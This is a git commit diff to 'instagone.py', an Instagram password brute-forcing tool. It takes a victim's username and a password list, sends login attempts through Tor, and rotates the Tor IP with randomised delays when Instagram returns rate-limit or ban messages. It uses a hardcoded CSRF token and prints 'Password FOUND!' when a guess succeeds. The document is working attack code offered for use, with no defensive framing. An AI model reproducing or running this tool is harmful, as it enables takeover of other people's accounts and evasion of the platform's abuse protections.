f0220a2870a560f71a840a2755c5e75e61c1901f
Kristof Hracza <57770911+IVBecy@users.noreply.github.com>
2020-09-23 21:19:37 +0100

    edited sleep() times, + added error_type to check

--- instagone.py
+++ instagone.py
@@ -1,4 +1,4 @@
-import requests, time, threading, sys, json
+import requests, time, sys, json, random
 from stem import Signal
 from stem.control import Controller
 from optparse import OptionParser
@@ -23,15 +23,19 @@ def usage():
     Usage: instagone.py [-u] username [-l] passwordlist
 
     REQUIRED:
+        -------------------------------------
         -u or --username: 
           The username of the victim
-        #######################################
+        -------------------------------------
         -l or --list: 
           The password list to be used 
+        -------------------------------------
 
     HELP:
+        -------------------------------------
         -h or --help:
           Displays this menu
+        -------------------------------------
         
     """)
     sys.exit()
@@ -56,7 +60,6 @@ class Engine():
     ############# variables to be used throughout the code ##################
     self.fetchTime = 60
     self.line = 0
-    self.hopCount = 0
     self.lineMultiplier = 30
     self.KeyError = False
     self.uname = options.uname
@@ -66,8 +69,9 @@ class Engine():
     self.HOME_URL = "https://www.instagram.com/"
     self.proxies = {
         "https": "socks5://127.0.0.1:9050",
-        "http": "socks5://127.0.0.1:9050"
+        "http":  "socks5://127.0.0.1:9050"
     }
+    ########################## HEADERS #########################################
     with open("headers.json",) as h:
       self.headers = json.load(h)
     ############# putting all the passwords into an array #########################
@@ -75,89 +79,108 @@ class Engine():
     for line in passwordFile:
       self.passwordArray.append(line.strip())
 
-  ########################### METHODS ########################################
+  ########################### METHODS ########################################  
   # New TOR IP 
   def renew_tor_ip(self):
-    time.sleep(10)
+    timeout = random.randint(5, 15)
+    print(f"[*] Timing out for {timeout} seconds")
+    time.sleep(timeout)
     with Controller.from_port(port=9051) as controller:
       controller.authenticate()
       controller.signal(Signal.NEWNYM)
-      print("[!] New IP is issued")
-      print("-"*self.lineMultiplier+"\n")
+      print("[*] New IP is issued")
+      time.sleep(1)
 
   # Deal with a new password
   def passHandling(self):
-    self.hopCount += 1
     self.p = self.passwordArray[self.line]
     print("-"*self.lineMultiplier)
     print(f"Username: {self.uname}")
     print(f"Password: {self.p}")
-    print(f"Passwords Number: {self.line}")
+    print(f"Passwords place: {self.line}")
     print("-"*self.lineMultiplier)
     self.line += 1
     return self.p
 
+  # logging in
   def loginProcedure(self):
-    # Headers, Cookies, and setting the csrftoken
     session = requests.Session()
     session.headers.update(self.headers)
-    session.cookies.update({'sessionid': '', 'mid': '', 'ig_pr': '1','ig_vw': '1920', 'csrftoken': '',  's_network': '', 'ds_user_id': ''})
-    # sea surf token
-    #token = session.get(self.HOME_URL,timeout=self.fetchTime).cookies.get_dict()['csrftoken']
-    session.headers.update({'X-CSRFToken': "zBmBPInIrzuVsDYEEWocPLRkHvwKVQyd"})
+    try:
+      session.get(self.HOME_URL).cookies.get_dict()['csrftoken']
+    except KeyError:
+      session.headers.update({'X-CSRFToken': "UBhDYWOc7qXMzNPYlrgK0QadlORboNg8"})
+    session.proxies = self.proxies
+    ip_response = json.loads(session.get("http://httpbin.org/ip").text)
+    self.myip = ip_response["origin"]
+    print(self.myip)
     # login
     str_time = str(int(time.time()))
     PASSWORD = '#PWD_INSTAGRAM_BROWSER:0:' + str_time + ':' + self.p
     login_data = {"username": self.uname, "enc_password": PASSWORD}
-    self.loginInfo = session.post(self.LOGIN_URL, data=login_data, proxies=self.proxies, allow_redirects=True, timeout=self.fetchTime)
+    self.loginInfo = session.post(self.LOGIN_URL, data=login_data, allow_redirects=True, timeout=self.fetchTime)
     return self.loginInfo
 
+  # Checking responses
   def getError(self):
     #responses from IG
     self.response = json.loads(self.loginInfo.text)
+    print(self.response)
     #banned IP
     if "message" in self.response:
       if self.response["message"] == "Please wait a few minutes before you try again.":
         print("[!] IP banned by Instagram")
-        print("-"*(self.lineMultiplier - 10))
         self.renew_tor_ip()
         self.line -= 1
         return None
+      elif self.response["message"] == "feedback_required":
+        print("[!] IP banned by Instagram")
+        self.renew_tor_ip()
+        self.line -= 1
       #check point
-      if self.response["message"] == "checkpoint_required":
+      elif self.response["message"] == "checkpoint_required":
         print(f"""\n
-  [+] Password FOUND!
+          [+] Password FOUND!
 
-  Password: {self.p}
+          Password: {self.p}
 
-  Username: {self.uname}      
+          Username: {self.uname}      
 
-Script ended at: {time.ctime()}
-  
-  \n""")
+        Script ended at: {time.ctime()}
+        
+        \n""")
         sys.exit()
     #bad pass
-    if  "authenticated" in self.response:
+    elif  "authenticated" in self.response:
       # no pass match
       if self.response["authenticated"] is False:
         print("[-] No match")
       # pass match
       elif self.response["authenticated"] is True:
         print(f"""\n
-  [+] Password FOUND!
+          [+] Password FOUND!
 
-  Password: {self.p}
+          Password: {self.p}
 
-  Username: {self.uname}   
+          Username: {self.uname}   
 
-Script ended at: {time.ctime()}   
-  
-  \n""")
+        Script ended at: {time.ctime()}   
+    
+        \n""")
         sys.exit()
+    #request error
+    elif "error_type" in self.response:
+      if self.response["error_type"] == "generic_request_error":
+        print("[!] Request error")
+        self.renew_tor_ip()
+
+    #ending lines
     print("-"*self.lineMultiplier+"\n")
+
 
 print(banner)
 BRUTER = Engine()
+# LOOPING
 while True:
   BRUTER.passHandling()
   BRUTER.loginProcedure()
